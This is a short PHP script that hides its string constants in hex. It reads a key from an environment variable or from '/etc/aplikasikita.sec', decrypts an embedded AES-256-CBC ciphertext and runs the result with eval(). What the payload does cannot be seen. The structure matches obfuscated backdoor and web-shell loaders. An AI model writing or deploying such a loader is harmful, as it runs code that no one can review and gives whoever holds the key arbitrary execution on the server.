<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZuywtDn2Gcg+s7DtzTRL8A==');

$c=base64_decode(

'dDItgjOubGkeS411w6ptx3fZVlTGvF3Lpl1B1nHBwzPNiD85YDxgaYhgmZZ6n4a0NYVCNvEpmcaP' .
'5A5GK6QBbJtjjdlttndctHeQ8gw1T8fgAWrSFYqt7Y69x2VyzJ3PgheQ1jMOtv298LYdBGftIj4t' .
'nn+E6qiFIv3eGAX+8sKBCCWhE33ZNGd6SHCw8uBSQ0VRkWmb+88C6v5ctoERqZ3Fg1swKN2Qj2Me' .
'vBnogWiiaF5EoFdVcpxAeIi2v4IX71qwmSIT0YDQJ3GGPkxv148uJf6MOnrO79DEpfPjUh91zBHU' .
'qDsHP5+oP/rFr1mWubfGItwkNMluOsiEh5erN6Lmybrkaqiw7WNKrflkl2PrpO478f/NDLfEPoEZ' .
'K1tjYdmD6EuV9VxFI7CkyHPX8tYhyfK+Hawr7mEMESlF6Viyyn4nrAFOjAk6ntYCW8bLgSSJNEtN' .
'OVGV0u9jX6AQ8faCqZIBUgZq7+VjnPSRvxsN3Dlcwgt6D4F9b3LIxFbBmiTONMdwBjkHrKykN83n' .
'0O31WuBAa0azqT6fXpHlb9gg+adWFHMfxCSk7KgfofqEbjTFudwrMWft2QRXyvjO21PU89BeqAYh' .
'efE6zhUIqFp5v5bWdo4snI4/tc1E0/7YMEiB79TGjpGKN/Vbsq/LaRvvh128g9GoJVeUBhMJ69+Y' .
'N1f8GmIFFENMHn+u/Om6UFELFAKwByoQ19rH9AVtFg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

